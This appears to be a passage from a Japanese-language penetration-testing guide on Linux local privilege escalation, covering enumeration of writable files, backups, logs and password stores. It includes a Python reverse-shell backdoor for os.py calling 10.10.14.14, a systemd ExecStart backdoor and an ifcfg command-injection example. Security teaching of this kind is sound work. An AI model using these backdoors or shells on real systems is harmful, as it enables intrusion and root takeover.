注: BSD プラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**機密ファイルに書き込めるか**確認してください。たとえば、**サービス設定ファイル**に書き込めますか？

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

たとえば、マシンで**tomcat**サーバーが稼働していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる**場合、次の行を変更できます。

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

次回 tomcat が起動したときに、backdoor が実行されます。

### フォルダを確認する

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（おそらく最後のフォルダは読めませんが、試してみてください）

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 不審な場所/所有ファイル

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 直近数分間に変更されたファイル

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### SQLite DBファイル

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

読み取り可能なアプリケーションデータベースでは、ユーザー名やパスワードハッシュが含まれていそうなテーブル名とカラム名を調べます。ハッシュを見つけること、そのパスワードを復元すること、ローカルアカウントで使い回されていることを証明することは、それぞれ別の手順です。一般的な32文字の16進数文字列だけでは、MD5やアカウントへのアクセス権があるとは判断できません。

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

読み取り可能なシェル履歴に`sudo`コマンドの後でパスワードのような短い行があれば、前後の行を手動で確認してください。通常の`sudo`プロンプトに入力したパスワードはシェル履歴に保存されません。次の行は誤ってシェルに入力された可能性があるだけで、有効なパスワードである証拠にはなりません。`.sudo_as_admin_successful`マーカーは過去の使用を記録するもので、現在の権限を示すものではありません。

### 隠しファイル

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH内のスクリプト/バイナリ**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Webファイル**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **バックアップ**

バックアップディレクトリ内の読み取り可能なファイルに加え、**名前**に `backup` を含むファイルも調べてください。名前が不明瞭なアーカイブや暗号化拡張子のファイルでも、古いアプリケーションデータが露出している可能性があります。暗号化アーカイブは、あくまで露出候補です。パスワードの復旧、内容の調査、アプリケーションのハッシュの復元、そのパスワードを Unix アカウントで再利用できるかどうかは、それぞれ別途確認が必要です。アーカイブ内にハッシュがあっても、ローカルログインが可能だとは限りません。

読み取り可能な仮想マシンのバックアップも同様に確認してください。VirtualBox の `.vbox` 設定ファイルから接続された `.vdi` イメージを特定でき、暗号化ディスクキーのメタデータが含まれている場合もあります。[VirtualBox のドキュメントによると、暗号化データキーは VM の設定ファイルに保存されます](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)。オフラインでディスクを調査するには、設定ファイルとイメージの両方にアクセスできる必要があります。ゲストのボリュームには、別のキーが必要な独自の [LUKS 暗号化レイヤー](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)がある場合もあります。正当な権限のもとで復号した後でも、古いスクリプトや設定ファイルにパスワードが含まれている可能性があります。これをローカルでの権限昇格と判断する前に、その認証情報がホストアカウントで現在も有効であることと、有効な `sudo` ポリシーで特権コマンドを実行できることを確認してください。受動的な列挙中は、イメージをコピー、復号、マウントせずに、パスと権限を把握してください。

読み取り可能なアーカイブを調べる際は、何かを展開する前に、まずメンバー名を一覧表示してください。稼働中のファイルが保護されていても、隠された認証ファイル、リカバリーコード、SSH キーが含まれている場合があります。ファイル名は手がかりにすぎません。内容とアカウントでの使い回しの有無は、それぞれ別途確認してください。

バックアップディレクトリでは、**別のユーザーが所有する読み取り可能なアーカイブ**、特に root 所有のアーカイブやグループメンバーシップ経由でアクセスできるアーカイブを優先して調べてください。稼働中のファイルが保護されていても、古いアーカイブに設定情報や認証シークレットが含まれている場合があります。[Backrest](https://garethgeorge.github.io/backrest/) のようなローカルバックアップ UI では、サービスの実効アカウントと、権限の低いユーザーがその設定を読み取れるか、UI に認証できるかを確認してください。その [hooks](https://garethgeorge.github.io/backrest/docs/hooks) と [restic コマンドインターフェース](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto)は、デーモンが持つファイルおよびコマンドの権限で動作します。リスナーが loopback のみで待ち受けていることだけでは、影響は判断できません。Backrest の `passwordBcrypt` は、[認証コード](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)にある base64 エンコード済みの bcrypt ハッシュであり、平文パスワードではありません。露出したアーカイブや UI を権限境界として扱う前に、サービスの実行ユーザー、有効な認証情報、該当するプランまたはリポジトリへのアクセスを確認してください。

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### パスワードを含む可能性のある既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを確認してください。**パスワードを含む可能性のある複数のファイル**を検索します。\
同様の用途に使える**もう1つの便利なツール**は、Windows、Linux、Macのローカルコンピューターに保存された多数のパスワードを取得するオープンソースアプリケーションの[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。

`/etc/guacamole/guacamole.properties`を読み取れる場合は、`mysql-*`、`postgresql-*`、`sqlserver-*`のデータベース接続設定を確認してください。アカウントにGuacamole JDBCテーブルの読み取り権限がある場合、`guacamole_connection_parameter`に保存済みのSSH `username`、`password`、`private-key`、`passphrase`の値が含まれていることがあります。まず接続IDとパラメーター名を確認し、その後、関連する行だけを調べてください。保存された値は、再利用可能なシークレットではなく、動的トークンやvaultへの参照である可能性があります。[Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html)と[SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html)を参照してください。

[pswm password manager](https://github.com/Julynx/pswm#usage)は、デフォルトで暗号化されたvaultを`~/.local/share/pswm/pswm`に保存します。他のユーザーのvaultが見える場合は、その所有者と、自分のアカウントで実際に読み取れるかを確認してください。vaultのパスが分かっただけでは認証情報は明らかになりません。マスターパスワードを復旧すること、再利用可能なアカウントパスワードを見つけること、そのアカウントの権限を確認することは、それぞれ別の手順です。

[Passpieのデフォルトデータベース](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database)は`~/.passpie/`です。グループディレクトリ内に`.keys`キーストアと、暗号化された`.pass`認証情報ファイルがあります。データベースディレクトリが見えることは、パスの手掛かりにすぎません。キーと関連する暗号化エントリーにアクセスできるか、マスターパスフレーズが必要か、復元した認証情報がより高い権限を持つアカウントのものかを確認してください。Passpieは[カスタムデータベースパス](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)にも対応しているため、デフォルトのパスですべてを網羅できるわけではありません。自動列挙では、認証情報をエクスポートしたり、キーの内容を出力したりせず、メタデータを一覧表示してください。

### ログ

ログを読み取れる場合、**中に興味深い情報や機密情報が見つかる**可能性があります。ログが不自然であるほど、興味深い内容が含まれている可能性が高くなります。\
また、一部の「**不適切な**」設定（バックドアが仕込まれている可能性もあります）の**audit logs**では、この投稿で説明されているように、**パスワードをaudit logsに記録できる**場合があります。[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

ログを**読むためには** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) グループが非常に役立ちます。

### シェルファイル

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 汎用Creds検索/Regex

ファイル名または内容に「**password**」という単語が含まれるファイルを探し、ログ内のIPやメールアドレス、ハッシュの正規表現も確認してください。\
これらすべての方法をここに列挙するつもりはありませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

Pythonスクリプトが**どこで**実行されるか分かっていて、そのフォルダに**書き込める**、またはPythonライブラリを**変更できる**場合は、OSライブラリを変更してbackdoorを仕込めます（Pythonスクリプトが実行される場所に書き込める場合は、os.pyライブラリをコピーして貼り付けてください）。

**ライブラリにbackdoorを仕込む**には、os.pyライブラリの末尾に次の行を追加してください（IPとPORTを変更してください）。

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### logrotateの悪用

特権ユーザーの`logrotate`ジョブが、ローテーション中に低権限ユーザーが置き換えたりリダイレクトしたりできるディレクトリ配下のログを実際にローテーションすると、ユーザー間のファイル書き込み経路が生じる可能性があります。ログに書き込み可能というだけでは、調査の手がかりにすぎません。有効なルールの`create`、`olddir`、`su`ディレクティブ、スケジューラーの実効ユーザー、ログの親ディレクトリに対する書き込み権限と検索権限、インストール済みビルドとポリシーが保存先の変更を許可するかを確認してください。また、スタートアップファイルへの書き込みをコマンド実行につなげるには、その後に起動した特権シェルが生成されたファイルを読み込む必要があります。ローテーションを発生させたり、競合状態を試したりせずに、スケジュール、ルール、バージョンとパッケージング、パスのメタデータを調べてください。

> [!TIP]
> `3.18.0`やその他のバージョン文字列だけを、悪用可能性の境界とみなさないでください。[上流の変更履歴](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)には、複数のリリースにわたるディレクトリとシンボリックリンクの強化が記録されており、ディストリビューションが修正をバックポートしている場合もあります。[上流のマニュアル](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)では、非特権ユーザーが管理するディレクトリ内のログをrootがローテーションする場合に`su`を使うことを推奨しています。有効なルールと実際の動作を確認してください。

この脆弱性の詳細は、こちらのページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

この脆弱性は[**logrotten**](https://github.com/whotwagner/logrotten)で悪用できます。

この脆弱性は[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**とよく似ています。そのため、ログを変更できることが分かったら、誰がそのログを管理しているかを確認し、ログをシンボリックリンクに置き換えて権限昇格できないか調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)。<sup>[[20]](#references)</sup>

低権限ユーザーが`ifcfg-*`ファイルを作成または変更でき、かつ特権ネットワーク有効化処理がそのファイルを実際に読み込む場合、調査すべき手がかりになります。有効なファイルとディレクトリの権限、選択されているインターフェース、インストール済みの`ifup`/`ifdown`の実装、およびそれらを実行するユーザーを確認してください。ファイルに書き込み可能なだけでは、コードは実行されません。[Red HatのRHEL 7ネットワークガイド](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)では、旧式のネットワークスクリプトとNetworkManagerを区別しています。NetworkManager自体は前者を起動しません。[RHEL 8のドキュメント](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)によると、デフォルトの`ifup`/`ifdown`はNetworkManagerを使用しますが、オプションの旧式パッケージにはシェルスクリプトが含まれます。

特権付きの旧式スクリプトを実際に使用しているシステムでは、引用符で囲まれず、シェルから読み込まれる`NAME=`などの`ifcfg-*`の代入によって、コード実行の境界を越えられる場合があります。ファイル名やNetworkManagerの有無からシェルによる解釈を推測せず、実際のパーサー、値、起動経路を確認してください。呼び出し元の入力を`ifcfg-*`ファイルに書き込み、その後に旧式の`ifup`を呼び出すことを許可されたsudoラッパーは、呼び出し元がファイルを直接編集できない場合でも、この境界に至る別の経路となります。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network と /bin/id の間に空白がある点に注意_)

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、**従来の Linux サービス管理システム**である System V init（SysVinit）の**スクリプト**が格納されています。サービスの `start`、`stop`、`restart`、場合によっては `reload` を実行するスクリプトが含まれています。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat システムでは、代替パスとして `/etc/rc.d/init.d` が使用されます。

一方、`/etc/init` は、Ubuntu が導入した新しい**サービス管理システム**である **Upstart** に関連しており、サービス管理タスク用の設定ファイルを使用します。Upstart への移行後も、Upstart の互換性レイヤーにより、SysVinit スクリプトは Upstart の設定と併用されています。

**systemd** は、オンデマンドでの daemon 起動、automount 管理、システム状態のスナップショットなどの高度な機能を備えた、最新の初期化・サービス管理システムです。ディストリビューションのパッケージ用ファイルは `/usr/lib/systemd/` に、管理者による変更用ファイルは `/etc/systemd/system/` に整理されており、システム管理プロセスを効率化します。<sup>[[21]](#references)</sup>

## その他のテクニック

### NFS 権限昇格


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 制限付き Shell からの脱出


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android の rooting framework は、syscall を hook して、userspace の manager に特権付きの kernel 機能を公開することがよくあります。manager の認証が弱い場合（例: FD の順序に基づく署名チェックや脆弱なパスワード方式）、ローカルアプリが manager になりすまして、root 化済みデバイス上で root 権限を取得できる可能性があります。詳細と exploit の方法については、こちらを参照してください。


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426): regex ベースの exec によるもの (CVE-2025-41244)

VMware Tools/Aria Operations の regex ベースの service discovery は、プロセスのコマンドラインからバイナリのパスを抽出し、特権コンテキストで `-v` を付けて実行できます。制限の緩いパターン（例: `\S` を使用するもの）は、書き込み可能な場所（例: `/tmp/httpd`）に攻撃者が配置した listener に一致することがあり、root としての実行につながります（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

詳細と、他の discovery/monitoring stack にも適用できる汎用的なパターンについては、こちらを参照してください。

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel セキュリティ保護

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix 権限昇格ツール

### **Linux のローカル権限昇格ベクトルを探す最適なツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC の kernel の脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプト集**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning（Crontab UI の権限昇格、zip -P の認証情報再利用）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron で実行される monitor 用の偽造 .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch の bypass（sudo env_keep PATH の hijack）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux の基本的な権限昇格](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux 権限昇格ガイド](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [攻撃と防御: 2016 年の Linux 権限昇格テクニック](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [誰も command execution を予期しない！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux 権限昇格)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux 権限昇格のヒントとテクニック](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux の列挙と権限昇格ツール](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket とは？](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) の writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS を使う](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables による Linux 権限昇格](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux 権限昇格](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux で ACL を管理する方法](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts による Redhat/CentOS の root 取得](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd とは？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（ログ経由の bash 算術式インジェクション、攻撃全体の流れ）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV（非対話型起動ファイル）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink による権限昇格）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup cron copy → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 名前を付ければ、VMware が権限を昇格する (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot による権限昇格](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 と CVE-2025-32463: Sudo の権限昇格の脆弱性](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC リポジトリディレクトリ](https://peps.python.org/pep-3147/)
- [32] [Python importlib ドキュメント](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec による Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux でのパスワード記録](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - logrotate の race condition の詳細](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
